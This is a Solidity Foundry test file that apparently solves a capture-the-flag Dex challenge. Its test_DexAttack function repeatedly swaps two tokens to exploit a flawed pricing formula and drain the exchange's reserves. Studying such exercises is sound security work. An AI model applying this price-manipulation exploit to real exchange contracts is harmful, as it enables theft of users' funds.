// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Test, console2} from "forge-std/Test.sol";
import {Dex, SwappableToken} from "../../src/dex/Dex.sol";

contract DexTest is Test {
    Dex public dex;
    address public dexAddy;
    SwappableToken public token1;
    address public token1Addy;
    SwappableToken public token2;
    address public token2Addy;
    address player = makeAddr("player");

    function setUp() public {
        dex = new Dex();
        dexAddy = address(dex);
        token1 = new SwappableToken(dexAddy, "token1", "token1", 110);
        token1Addy = address(token1);
        token2 = new SwappableToken(dexAddy, "token2", "token2", 110);
        token2Addy = address(token2);
        dex.setTokens(token1Addy, token2Addy);
        dex.approve(dexAddy, type(uint256).max);
        // muevo 100 al dex
        dex.addLiquidity(token1Addy, 100);
        dex.addLiquidity(token2Addy, 100);
        // muevo 10 al player
        token1.transfer(player, 10);
        token2.transfer(player, 10);
    }

    function test_DexCreation() public {
        assertEq(dex.token1(), token1Addy);
        assertEq(dex.token2(), token2Addy);
        assertEq(token1.balanceOf(dexAddy), 100);
        assertEq(token1.balanceOf(player), 10);
        assertEq(token2.balanceOf(dexAddy), 100);
        assertEq(token2.balanceOf(player), 10);
    }

    function test_DexAttack() public {
        vm.startPrank(player);
        dex.approve(dexAddy, type(uint256).max);
        dex.swap(token1Addy, token2Addy, 10);
        console2.log(token1.balanceOf(player));
        console2.log(token2.balanceOf(player));
        dex.swap(token2Addy, token1Addy, 20);
        console2.log(token1.balanceOf(player));
        console2.log(token2.balanceOf(player));
        dex.swap(token1Addy, token2Addy, 24);
        console2.log(token1.balanceOf(player));
        console2.log(token2.balanceOf(player));
        dex.swap(token2Addy, token1Addy, 30);
        console2.log(token1.balanceOf(player));
        console2.log(token2.balanceOf(player));
        dex.swap(token1Addy, token2Addy, 41);
        console2.log(token1.balanceOf(player)); //0
        console2.log(token2.balanceOf(player)); //65
        dex.swap(token2Addy, token1Addy, 30);
        console2.log(token1.balanceOf(player)); //73-37
        console2.log(token2.balanceOf(player)); //35-75
        dex.swap(token1Addy, token2Addy, 37);
        console2.log("price player");

        console2.log(token1.balanceOf(player)); //73-37
        console2.log(token2.balanceOf(player)); //35-75
    }
}
